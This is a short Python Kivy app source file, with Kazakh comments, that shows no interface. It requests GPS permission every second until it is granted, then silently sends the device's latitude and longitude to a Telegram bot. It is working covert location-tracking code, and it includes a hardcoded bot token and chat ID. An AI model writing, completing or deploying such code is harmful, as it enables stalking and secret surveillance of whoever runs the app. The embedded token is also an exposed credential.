from kivy.app import App
from plyer import gps
from kivy.clock import Clock
import requests

# Бұл жерде сенің Telegram мәліметтерің сервер ретінде жұмыс істейді
TOKEN = "8711913443:AAFizqWhgtm9w58i2UD5PnckYiXWkKA1s2M"
CHAT_ID = "7594678193"

class SeekerApp(App):
    def build(self):
        # Рұқсат берілгенше әр 1 секунд сайын сұрай береді
        Clock.schedule_interval(self.check_permissions, 1)
        return None

    def check_permissions(self, dt):
        try:
            gps.configure(on_location=self.on_loc)
            gps.start()
        except NotImplementedError:
            print("GPS қолжетімсіз")
        except Exception as e:
            print(f"Рұқсат сұралуда: {e}")

    def on_loc(self, **kwargs):
        # Локация алынса, бірден Telegram-ға жібереді
        lat = kwargs.get('lat')
        lon = kwargs.get('lon')
        if lat and lon:
            url = f"https://api.telegram.org/bot{TOKEN}/sendLocation"
            payload = {"chat_id": CHAT_ID, "latitude": lat, "longitude": lon}
            try:
                requests.post(url, json=payload)
            except:
                pass

if __name__ == '__main__':
    SeekerApp().run()
